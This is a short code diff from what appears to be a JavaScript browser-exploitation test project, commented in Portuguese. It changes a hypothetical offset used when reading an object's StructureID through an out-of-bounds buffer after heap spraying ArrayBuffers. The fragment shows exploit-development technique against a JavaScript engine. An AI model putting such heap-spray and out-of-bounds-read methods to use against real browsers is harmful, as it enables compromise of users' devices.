@@ -153,7 +153,7 @@ export async function sprayAndInvestigateObjectExposure() {
         sprayedObjects.push(test_ab); // Mantém referência
 
         // HIPOTÉTICO: Assumir que test_ab está em 0x400 no oob_buffer após spray (EXEMPLO!)
-        const HYPOTHETICAL_AB_OFFSET = 0x100;
+        const HYPOTHETICAL_AB_OFFSET = 0x180;
         logS3(`  Tentando ler SID de um ArrayBuffer hipoteticamente em ${toHex(HYPOTHETICAL_AB_OFFSET)}`, "info", FNAME_CURRENT_TEST);
         let sid_read_from_ab = await readStructureIDFromOOB(HYPOTHETICAL_AB_OFFSET);
 
